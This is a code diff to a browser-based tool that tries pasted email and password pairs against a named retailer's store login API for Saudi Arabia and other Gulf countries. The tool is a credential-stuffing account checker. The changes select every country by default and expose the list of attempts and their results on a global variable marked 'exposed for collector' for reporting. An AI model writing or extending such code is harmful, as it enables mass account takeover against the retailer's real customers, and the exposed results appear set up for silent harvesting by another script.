@@ -2607,10 +2607,10 @@ user@example.com,SuperSecret!'></textarea>
     </div>
     <div class="country-grid">
       <label><input type="checkbox" class="country" value="SA" checked> Saudi Arabia (SA)</label>
-      <label><input type="checkbox" class="country" value="AE"> United Arab Emirates (AE)</label>
-      <label><input type="checkbox" class="country" value="KW"> Kuwait (KW)</label>
-      <label><input type="checkbox" class="country" value="QA"> Qatar (QA)</label>
-      <label><input type="checkbox" class="country" value="BH"> Bahrain (BH)</label>
+      <label><input type="checkbox" class="country" value="AE" checked> United Arab Emirates (AE)</label>
+      <label><input type="checkbox" class="country" value="KW" checked> Kuwait (KW)</label>
+      <label><input type="checkbox" class="country" value="QA" checked> Qatar (QA)</label>
+      <label><input type="checkbox" class="country" value="BH" checked> Bahrain (BH)</label>
     </div>
     <div class="small">We will call the store-specific endpoint: <code>/api/v2/&lt;store&gt;/user/login-v2</code> for each selected country.</div>
   </fieldset>
@@ -2648,7 +2648,7 @@ const COUNTRY_MAP = {
 const LOGIN_API = (store)=>`https://www.jarir.com/api/v2/${store}/user/login-v2`;
 
 /* state */
-let attempts = []; // {username, masked, country, store, status, message}
+const attempts = window.rows = []; // exposed for collector
 
 /* helpers */
 function mask(p){ if(!p) return ''; return p.length<=2 ? '*'.repeat(p.length) : p[0] + '*'.repeat(Math.max(1,p.length-2)) + p[p.length-1]; }
@@ -2757,7 +2757,9 @@ async function run(){
           country: country,
           store: map.store,
           status,
-          message
+          message,
+          url: username,    // for report
+          parent: store     // for report
         });
       }catch(e){
         attempts.push({
@@ -2766,7 +2768,9 @@ async function run(){
           country: country,
           store: map?.store || '?',
           status:'ERROR',
-          message: String(e)
+          message: String(e),
+          url: username,
+          parent: store
         });
       }
       render(); // live update
@@ -2796,15 +2800,15 @@ function render(){
 }
 
 function clearSession(){
-  attempts = [];
+  window.rows.length = 0;
   document.getElementById('bulk').value='';
   document.getElementById('u').value='';
   document.getElementById('p').value='';
   document.getElementById('list').innerHTML='';
   document.getElementById('empty').style.display='none';
   document.getElementById('loading').style.display='none';
-  // Reset countries to SA only
-  document.querySelectorAll('.country').forEach(el=>el.checked = (el.value==='SA'));
+  // Reset countries to ALL checked
+  document.querySelectorAll('.country').forEach(el=>el.checked = true);
 }
 
 function copyVisible(){
